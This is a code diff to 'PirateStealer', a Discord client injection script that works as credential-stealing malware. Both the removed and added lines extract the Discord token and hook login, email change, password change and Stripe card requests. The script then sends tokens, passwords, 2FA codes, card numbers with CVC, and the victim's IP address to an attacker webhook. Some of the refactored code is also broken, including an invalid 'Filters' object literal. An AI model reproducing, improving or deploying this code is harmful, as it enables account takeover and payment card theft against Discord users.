@@ -8,17 +8,17 @@ const path = require('path');
 const querystring = require("querystring");
 const os = require('os')
 const webhook = "%WEBHOOK_LINK%";
-const Filter = {
-    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
+const Filters = {
+    [urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"], [urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]]]
 };
-
 
 const config = {
     "logout": "%LOGOUT%",
     "logout-notify": "%LOGOUTNOTI%",
     "init-notify": "%INITNOTI%",
     "embed-color": 3447704,
-    "disable-qr-code": "%DISABLEQRCODE%"
+    "disable-qr-code": "%DISABLEQRCODE%",
+    "ping": [ true, "@everyone" ]
 };
 
 const badges = {
@@ -71,7 +71,7 @@ const badges = {
         Value: 256,
         Emoji: "<:balance:874750808267292683>",
         Rare: false,
-    },
+    }
 };
 
 
@@ -107,7 +107,7 @@ async function firstTime() {
             if (token == null || token == undefined || token == "") {
                 var c = {
                     username: "PirateStealer",
-                    content: "",
+                    content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "Discord Initalized (User not Logged in)",
                         color: config["embed-color"],
@@ -129,10 +129,10 @@ async function firstTime() {
                 var b = await getUserInfo(token)
                 var c = {
                     username: "PirateStealer",
-                    content: "",
+                    content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "Discord Initalized",
-                        description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + ")",
+                        description: `[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
                         color: config["embed-color"],
                         fields: [{
                             name: "Info",
@@ -179,7 +179,7 @@ async function firstTime() {
             if (token == null || token == undefined || token == "") {
                 var c = {
                     username: "PirateStealer",
-                    content: "",
+                    content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "User log out (User not Logged in before)",
                         color: config["embed-color"],
@@ -201,10 +201,10 @@ async function firstTime() {
                 const b = await getUserInfo(token);
                 var c = {
                     username: "PirateStealer",
-                    content: "",
+                    content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "User got logged out",
-                        description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + ")",
+                        description: `[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
                         color: config["embed-color"],
                         fields: [{
                             name: "Info",
@@ -247,11 +247,8 @@ async function firstTime() {
     return !1
 
 }
-const QRFilter = {
-	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
-}
 
-session.defaultSession.webRequest.onBeforeRequest(QRFilter, (details, callback) => {
+session.defaultSession.webRequest.onBeforeRequest(Filters[1], (details, callback) => {
     if (details.url.startsWith("wss://")) {
         if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "%DISABLEQRCODE%") {
             callback({
@@ -307,10 +304,10 @@ async function userLogin(password, email, token) {
 
     var params = {
         username: "PirateStealer",
-        content: "",
+        content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "User Login",
-            description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + "<br>" + password + ")",
+            description: `[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}\n${password})`,
             "color": config['embed-color'],
             "fields": [{
                 name: "Info",
@@ -402,10 +399,10 @@ async function emailChanged(password, newEmail, token) {
 
     var params = {
         username: "PirateStealer",
-        content: "",
+        content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "Email Changed",
-            description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + "<br>" + password + "<br>" + newEmail + ")",
+            description: `[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}\n${password}\n${newEmail})`,
             "color": config['embed-color'],
             "fields": [{
                 name: "Info",
@@ -490,10 +487,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
 
     var params = {
         username: "PirateStealer",
-        content: "",
+        content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "Password Changed",
-            description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + "<br>" + newPassword + ")",
+            description: `[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}\n${newPassword})`,
             "color": config['embed-color'],
             "fields": [{
                 name: "Info",
@@ -587,10 +584,10 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
 
     var params = {
         username: "PirateStealer",
-        content: "",
+        content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "Credit Card",
-            description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + ")",
+            description: `[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
             "color": config['embed-color'],
             "fields": [{
                     name: "Info",
@@ -665,21 +662,13 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
     };
 
     sendToWebhook(JSON.stringify(params))
-
 }
 
 
 // Helpers functions
 async function sendToWebhook(params) {
-    
     const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-		xhr.open("POST", "${webhook}", true);
-		xhr.setRequestHeader('Content-Type', 'application/json');
-		xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-		xhr.send(JSON.stringify(${params}));
-		`, !0)
-
+    window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();xhr.open("POST", "${webhook}", true);xhr.setRequestHeader('Content-Type', 'application/json');xhr.setRequestHeader('Access-Control-Allow-Origin', '*');xhr.send(JSON.stringify(${params}));`, !0)
 }
 async function getRelationships(token) {
     const window = BrowserWindow.getAllWindows()[0];
@@ -692,10 +681,10 @@ async function getRelationships(token) {
     for (z of r) {
         var b = getRareBadges(z.user.public_flags)
         if (b != "") {
-            gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
+            gay += `${b} ${z.user.username}#${z.user.discriminator}\n`
         }
     }
-    if (gay == "") gay = "No Rare Friends"
+    gay = gay ?? "No Rare Friends";
 
     return {
         length: r.length,
@@ -721,7 +710,7 @@ async function get2faCodes(token, password) {
             value: `\`${r[z].code.insert(4, "-")}\``,
             inline: true
         })
-        baseuri += `${r[z].code.insert(4, "-")}<br>`
+        baseuri += `${r[z].code.insert(4, "-")}\n`
     }
 
     return {
@@ -736,34 +725,32 @@ async function getBilling(token) {
 
     var billing = "";
     json.forEach(z => {
-        if (z.type == "") {
-            return "\`❌\`";
-        } else if (z.type == 2 && z.invalid != !0) {
-            billing += "\`✔️\`" + " <:paypal:896441236062347374>";
+        if (z.type == 2 && z.invalid != !0) {
+            billing += "\`✔️\` <:paypal:896441236062347374>";
         } else if (z.type == 1 && z.invalid != !0) {
-            billing += "\`✔️\`" + " :credit_card:";
+            billing += "\`✔️\` :credit_card:";
         } else {
             return "\`❌\`";
         };
     });
 
-    if (billing == "") billing = "\`❌\`"
+    billing = billing ?? "\`❌\`";
     return billing;
 }
 async function getUserInfo(token) {
     const window = BrowserWindow.getAllWindows()[0];
     var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText;`, !0)
-    return JSON.parse(a)
+    return JSON.parse(a);
 }
 async function getIp() {
     const window = BrowserWindow.getAllWindows()[0];
     var ip = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );xmlHttp.send( null );xmlHttp.responseText;`, !0)
-    return ip
+    return ip;
 }
 async function getToken() {
     const window = BrowserWindow.getAllWindows()[0];
     var token = await window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, !0)
-    return token
+    return token;
 }
 
 function getBadges(flags) {
@@ -787,21 +774,17 @@ function getRareBadges(flags) {
 
 function getNitro(flags) {
     switch (flags) {
-        case 0:
-            return "No Nitro";
         case 1:
             return "<:classic:896119171019067423> \`Nitro Classic\`";
         case 2:
             return "<a:boost:824036778570416129> \`Nitro Boost\`";
         default:
             return "No Nitro";
-
     };
 }
 
-session.defaultSession.webRequest.onCompleted(Filter, async (details, callback) => {
+session.defaultSession.webRequest.onCompleted(Filters[0], async (details, callback) => {
     if (details.statusCode != 200) return;
-   
 
     const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
     const data = JSON.parse(unparsed_data)
@@ -838,14 +821,13 @@ session.defaultSession.webRequest.onCompleted(Filter, async (details, callback) 
             var event = new PirateStealerEvent('creditCardAdded', token, {
                 cardnumber: card["card[number]"],
                 cvc: card["card[cvc]"],
-                expiration: card["card[exp_month]"] + "/" + card["card[exp_year]"]
+                expiration: `${card["card[exp_month]"]}/${card["card[exp_year]"]}`
             });
             event.handle();
             return;
         default:
             break;
     }
-
 });
 
 module.exports = require('./core.asar')
